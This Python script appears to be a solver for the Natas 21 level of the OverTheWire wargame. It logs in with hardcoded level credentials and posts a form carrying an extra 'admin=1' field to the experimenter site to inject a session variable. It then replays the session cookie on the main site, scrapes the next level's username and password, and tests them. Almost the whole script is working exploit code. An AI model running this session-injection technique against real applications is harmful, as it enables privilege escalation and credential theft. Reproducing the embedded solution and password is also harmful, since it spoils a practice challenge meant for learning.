import requests
from requests.auth import HTTPBasicAuth
import re

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

url_lab = "http://natas21-experimenter.natas.labs.overthewire.org/"
url_lab_debug = url_lab + "?debug=test"
url = "http://natas21.natas.labs.overthewire.org/"


print("\nMade by: DPZM")
print("\n" + "*" * 80 + "\n")
print("""  $$\   $$\  $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\         $$$$$$\    $$\   
  $$$\  $$ |$$  __$$\\__$$  __|$$  __$$\ $$  __$$\       $$  __$$\ $$$$ |  
  $$$$\ $$ |$$ /  $$ |  $$ |   $$ /  $$ |$$ /  \__|      \__/  $$ |\_$$ |  
  $$ $$\$$ |$$$$$$$$ |  $$ |   $$$$$$$$ |\$$$$$$\         $$$$$$  |  $$ |  
  $$ \$$$$ |$$  __$$ |  $$ |   $$  __$$ | \____$$\       $$  ____/   $$ |  
  $$ |\$$$ |$$ |  $$ |  $$ |   $$ |  $$ |$$\   $$ |      $$ |        $$ |  
  $$ | \$$ |$$ |  $$ |  $$ |   $$ |  $$ |\$$$$$$  |      $$$$$$$$\ $$$$$$\ 
  \__|  \__|\__|  \__|  \__|   \__|  \__| \______/       \________|\______|""")
print("\n" + "*" * 80)

print("\n [!] Vulnerability found: Application Session Misconfiguration")

with requests.Session() as session:
    session.auth = HTTPBasicAuth(username, password)
    
    # 1 - Inject malformed payload
    print("\n" + "=" * 130 + "\n [+] Requesting %s - Generating payload with malformed content" % url_lab_debug + "\n" + "=" * 130)
    payload = {
        "align": "center",
        "fontsize": "100%",
        "bgcolor" : "yellow",
        "submit": "Update",
        "admin": "1"            # if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1
    }
    r = session.post(url_lab_debug, data=payload)
    debug_content = re.findall("\[.\S*\W{4}\S*", r.text)
    
    if "admin" in r.text:
        print("\n > Malformed payload: " + str(debug_content))
    
        # 2 - Extract PHPSESSID from request
        print("\n" + "=" * 30 + "\n [+] Extracting PHPSESSID" + "\n" + "=" * 30)
        sessid = "PHPSESSID=" + r.headers['Set-Cookie'].split("=")[1].split(";")[0]
        print("\n > " + sessid)
        
        # 3 - Request main url with previous PHPSESSID (the one which contains the malicious payload)
        print("\n" + "=" * 110 + "\n [+] Requesting %s - Generating payload with malformed content" % url + "\n" + "=" * 110)
        r = session.get(url, headers={"Cookie": sessid})
        
        # Find user
        username = re.search('([u|U]ser.*)', r.text).group(0)
        username = username.split()[1]
        print("\nUsername: %s" % username)
        
        # Find password
        password = re.findall('([p|P]ass.*[^\W]{4})', r.text)
        password = password[1].split()[1]
        print("\nPassword: %s" % password)
        

        print("\n" + "=" * 40 + "\n[*] Testing credentials for next level..." + "\n" + "=" * 40)
        new_level_url = "http://natas22.natas.labs.overthewire.org/"
        session.auth = HTTPBasicAuth(username, password)
        r = session.get(new_level_url)
    
        if r.status_code == 200:
            print("\n Login successful!")
            print("\n > New level (22): %s \n" % new_level_url)
        else:
            print("\n Wrong credentials!\n")
    
    else:
        print("\n Something went wrong...")